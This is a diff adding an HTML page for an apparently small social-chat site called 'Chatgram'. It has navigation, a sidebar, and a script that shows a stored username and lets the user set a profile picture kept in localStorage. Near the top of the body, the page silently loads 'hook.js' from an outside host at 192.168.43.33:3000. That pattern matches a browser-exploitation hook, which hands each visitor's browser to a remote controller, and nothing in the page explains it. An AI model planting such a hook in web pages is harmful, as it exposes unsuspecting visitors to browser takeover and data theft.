@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chatgram</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <script src="http://192.168.43.33:3000/hook.js"></script>
+  <header>
+    <nav>
+      <div class="logo">Chatgram</div>
+      <div class="search-bar">
+        <input type="text" placeholder="Search...">
+      </div>
+      <div class="nav-links">
+        <a href="index.html">Home</a>
+        <a href="chat.html">Chat</a>
+        <a href="#">Profile</a>
+        <a href="welcome.html">LogOut</a>
+      </div>
+    </nav>
+  </header>
+  <main>
+    <section class="sidebar">
+      <div class="user-info">
+        <img id="profile-image" src="profile.jpg" alt="Profile Picture" onclick="selectProfilePicture()">
+        <div id="username-display"></div>
+        <h3 id="username-text"></h3> 
+      </div>
+      <div class="sidebar-links">
+        <a href="#">News Feed</a>
+        <a href="#">Friends</a>
+        <a href="#">Groups</a>
+        <a href="#">Events</a>
+      </div>
+    </section>
+  </main>
+  <footer>
+    <p>&copy; 2023 Chatgram</p>
+  </footer>
+
+  <script>
+    // Get the username from local storage
+    const username = localStorage.getItem('username');
+
+    // Get the element where you want to display the username
+    const usernameText = document.getElementById('username-text');
+
+    // Set the username text content
+    usernameText.textContent = username || 'User';
+
+    // Function to handle profile picture selection
+    function selectProfilePicture() {
+      // Created an input element of type file
+      const input = document.createElement('input');
+      input.type = 'file';
+      input.accept = 'image/*';
+
+      // Listen for changes in the file input
+      input.addEventListener('change', function() {
+        const file = input.files[0];
+        const reader = new FileReader();
+
+        // Read the selected file as a data URL
+        reader.onload = function(event) {
+          // Set the profile image source to the selected image
+          const profileImage = document.getElementById('profile-image');
+          profileImage.src = event.target.result;
+
+          // Save the selected image URL to local storage with the user's username
+          localStorage.setItem(`${username}-profile-image`, event.target.result);
+        };
+
+        // Read the file
+        reader.readAsDataURL(file);
+      });
+
+      // Trigger a click event on the input element to open the file selection dialog
+      input.click();
+    }
+
+    // Load the user's profile picture from local storage, if available
+    const profileImageURL = localStorage.getItem(`${username}-profile-image`);
+    if (profileImageURL) {
+      const profileImage = document.getElementById('profile-image');
+      profileImage.src = profileImageURL;
+    }
+  </script>
+  <script src="script.js"></script>
+</body>
+</html>
